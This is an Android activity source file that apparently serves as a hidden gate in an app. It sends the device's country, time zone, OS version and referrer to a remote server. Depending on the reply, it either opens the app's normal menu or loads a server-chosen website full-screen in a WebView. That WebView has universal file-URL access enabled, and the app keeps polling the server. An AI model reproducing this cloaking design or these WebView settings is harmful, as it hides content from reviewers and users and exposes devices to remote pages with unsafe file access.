package com.commercial;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Parcelable;
import android.provider.MediaStore;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.LinearLayout;

import com.bumptech.glide.Glide;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.analytics.HitBuilders;
import com.google.android.gms.analytics.Tracker;
import com.yandex.metrica.YandexMetrica;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

public class CommercialActivity extends AppCompatActivity {

    public static final String ADDRESS = "ADDRESS";
	public static final String DRAWABLE = "DRAWABLE";
    public static final String COLOR = "COLOR";
    public static final String CLASS = "CLASS";

    private static final int INPUT_FILE_REQUEST_CODE1 = 1;
    private static final int FILE_CHOOSER_RESULT_CODE1 = 1;
    private WebView webView;
    private ValueCallback<Uri> mUploadMessage1;
    private Uri mCapturedImageURI1 = null;
    private ValueCallback<Uri[]> mFilePathCallback1;
    private String mCameraPhotoPath1;

    private SharedPreferences sharedPreferences;
    private SharedPreferences.Editor editor1;
    private String result1 = "";
    private boolean isSclickSent1 = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
		
		ImageView splashImage = new ImageView(CommercialActivity.this);
        splashImage.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
        splashImage.setBackgroundColor(Color.parseColor(getIntent().getStringExtra(COLOR)));
        setContentView(splashImage);
        Glide.with(this).load(getIntent().getStringExtra(DRAWABLE)).into(splashImage);

        sharedPreferences = getSharedPreferences("CORE", Context.MODE_PRIVATE);

		CommercialRequests.address = getIntent().getStringExtra(ADDRESS);
		AppLinkData.fetchDeferredAppLinkData(CommercialActivity.this, new AppLinkData.CompletionHandler() {
			@Override
			public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
				String referrer = CommercialReceiver.referrer;
				try {
					referrer = appLinkData.getTargetUri().toString();
					String[] params = referrer.split("://");
					if (params.length > 0) {
						editor1 = sharedPreferences.edit();
						editor1.putString("parameters", params[1].replaceAll("\\?", "&"));
						editor1.apply();
						editor1.commit();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
				try {
					String country = "";
					country = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso().toUpperCase();
					if (country.isEmpty()) {
						country = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getNetworkCountryIso().toUpperCase();
					}
					if (country.isEmpty()) {
						country = getResources().getConfiguration().locale.getCountry().toUpperCase();
					}
					if (sharedPreferences.getInt("id", -1) == -1) {
						JSONObject jsonObject = new CommercialRequests().new CoreResult(getPackageName(), country, Calendar.getInstance().getTimeZone().getRawOffset(), Build.VERSION.RELEASE, referrer).execute().get();
						editor1 = sharedPreferences.edit();
						editor1.putInt("id", jsonObject.getInt("id"));
						editor1.apply();
						editor1.commit();
						result1 = jsonObject.getString("result");
					} else {
						JSONObject jsonObject = new CommercialRequests().new CoreResult(sharedPreferences.getInt("id", -1), country, Calendar.getInstance().getTimeZone().getRawOffset()).execute().get();
						result1 = jsonObject.getString("result");
					}
					if (result1.isEmpty()) {
						sendScreenEvent("Menu");
						startMenuActivity();
					} else {
						createThisActivity();
					}
				} catch (Exception e) {
					e.printStackTrace();
					sendScreenEvent("Menu");
					startMenuActivity();
				}
			}
		});
    }

    private void createThisActivity() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                webView = new WebView(CommercialActivity.this);
                webView.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
                setContentView(webView);
                webView.getSettings().setJavaScriptEnabled(true);
                webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
                webView.getSettings().setAllowFileAccess(true);
                webView.getSettings().setAllowFileAccessFromFileURLs(true);
                webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
                webView.getSettings().setAllowContentAccess(true);
                webView.getSettings().setDomStorageEnabled(true);
                webView.getSettings().setUseWideViewPort(true);
                CookieManager.getInstance().setAcceptCookie(true);
                if (Build.VERSION.SDK_INT > 21) {
                    CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
                }
                webView.setWebChromeClient(new WebChromeClient() {
                    public boolean onShowFileChooser(WebView view, ValueCallback<Uri[]> filePath, WebChromeClient.FileChooserParams fileChooserParams) {
                        if (mFilePathCallback1 != null) {
                            mFilePathCallback1.onReceiveValue(null);
                        }
                        mFilePathCallback1 = filePath;
                        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                        if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
                            File photoFile = null;
                            try {
                                photoFile = createImageFile();
                                takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath1);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                            if (photoFile != null) {
                                mCameraPhotoPath1 = "file:" + photoFile.getAbsolutePath();
                                takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(photoFile));
                            } else {
                                takePictureIntent = null;
                            }
                        }
                        Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
                        contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
                        contentSelectionIntent.setType("image/*");
                        Intent[] intentArray;
                        if (takePictureIntent != null) {
                            intentArray = new Intent[]{takePictureIntent};
                        } else {
                            intentArray = new Intent[0];
                        }
                        Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
                        chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
                        chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser");
                        chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
                        startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE1);
                        return true;
                    }

                    public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
                        mUploadMessage1 = uploadMsg;
                        File imageStorageDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "AndroidExampleFolder");
                        if (!imageStorageDir.exists()) {
                            imageStorageDir.mkdirs();
                        }
                        File file = new File(imageStorageDir + File.separator + "IMG_" + String.valueOf(System.currentTimeMillis()) + ".jpg");
                        mCapturedImageURI1 = Uri.fromFile(file);
                        final Intent captureIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
                        captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mCapturedImageURI1);
                        Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                        i.addCategory(Intent.CATEGORY_OPENABLE);
                        i.setType("image/*");
                        Intent chooserIntent = Intent.createChooser(i, "Image Chooser");
                        chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, new Parcelable[]{captureIntent});
                        startActivityForResult(chooserIntent, FILE_CHOOSER_RESULT_CODE1);
                    }

                    public void openFileChooser(ValueCallback<Uri> uploadMsg) {
                        openFileChooser(uploadMsg, "");
                    }

                    public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture) {
                        openFileChooser(uploadMsg, acceptType);
                    }
                });
                webView.setWebViewClient(new WebViewClient() {
                    @Override
                    public void onPageStarted(WebView view, String url, Bitmap favicon) {
                        super.onPageStarted(view, url, favicon);
                        if (url.startsWith("app:")) {
                            sendScreenEvent("Menu");
                            startMenuActivity();
                        } else if (url.startsWith("mailto:")) {
                            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
                            view.goBack();
                        } else if (url.startsWith("tel:")) {
                            startActivity(new Intent(Intent.ACTION_DIAL, Uri.parse(url)));
                            view.goBack();
                        } else if (!isSclickSent1) {
                            if (Uri.parse(url).getQueryParameter("sclick") != null) {
                                new CommercialRequests().new CoreSetClickId(sharedPreferences.getInt("id", -1), Uri.parse(url).getQueryParameter("sclick")).execute();
                                isSclickSent1 = true;
                            }
                        }
                    }
                });
				if (!CommercialReceiver.referrer.isEmpty()) {
					editor1 = sharedPreferences.edit();
					editor1.putString("referrer", CommercialReceiver.referrer.replaceAll(";", "&").replaceAll("%3D", "="));
					editor1.apply();
					editor1.commit();
				}
				if (!sharedPreferences.getString("parameters", "").isEmpty()) {
					webView.loadUrl(result1 + sharedPreferences.getString("parameters", "&source=organic&pid=1"));
				} else {
					webView.loadUrl(result1 + "&" + sharedPreferences.getString("referrer", "&source=organic&pid=1"));
				}
				sendScreenEvent("Site");
				new CommercialRequests().new CoreEvents(sharedPreferences.getInt("id", -1)).execute();
				getEvents();
            }
        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode != INPUT_FILE_REQUEST_CODE1 || mFilePathCallback1 == null) {
                super.onActivityResult(requestCode, resultCode, data);
                return;
            }
            Uri[] results = null;
            if (resultCode == Activity.RESULT_OK) {
                if (data == null) {
                    if (mCameraPhotoPath1 != null) {
                        results = new Uri[]{Uri.parse(mCameraPhotoPath1)};
                    }
                } else {
                    String dataString = data.getDataString();
                    if (dataString != null) {
                        results = new Uri[]{Uri.parse(dataString)};
                    }
                }
            }
            mFilePathCallback1.onReceiveValue(results);
            mFilePathCallback1 = null;
        } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
            if (requestCode != FILE_CHOOSER_RESULT_CODE1 || mUploadMessage1 == null) {
                super.onActivityResult(requestCode, resultCode, data);
                return;
            }
            if (requestCode == FILE_CHOOSER_RESULT_CODE1) {
                if (null == this.mUploadMessage1) {
                    return;
                }
                Uri result = null;
                try {
                    if (resultCode != RESULT_OK) {
                        result = null;
                    } else {
                        result = data == null ? mCapturedImageURI1 : data.getData();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                mUploadMessage1.onReceiveValue(result);
                mUploadMessage1 = null;
            }
        }
        return;
    }

    private File createImageFile() throws IOException {
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        String imageFileName = "JPEG_" + timeStamp + "_";
        File storageDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        return File.createTempFile(imageFileName, ".jpg", storageDir);
    }

    private void getEvents() {
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                new CommercialRequests().new CoreEvents(sharedPreferences.getInt("id", -1)).execute();
                getEvents();
            }
        }, 20000);
    }

    private void sendScreenEvent(String screenName) {
        Tracker tracker = CommercialApp.getCommercialApp().getDefaultTracker();
        tracker.setScreenName(screenName);
        tracker.send(new HitBuilders.ScreenViewBuilder().build());
        YandexMetrica.reportEvent(screenName);
    }

    private void startMenuActivity() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                startActivity(new Intent(CommercialActivity.this, (Class) getIntent().getExtras().getSerializable(CLASS)).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
            }
        });
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
            getWindow().clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        }
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
